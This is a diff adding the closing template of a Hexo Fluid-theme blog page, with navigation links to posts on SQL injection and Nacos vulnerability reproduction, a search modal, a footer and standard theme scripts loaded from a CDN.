+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/09/30/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/" title="SQL注入总结">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">SQL注入总结</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/08/02/nacos%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" title="nacos历史漏洞复现">
+                        <span class="hidden-mobile">nacos历史漏洞复现</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
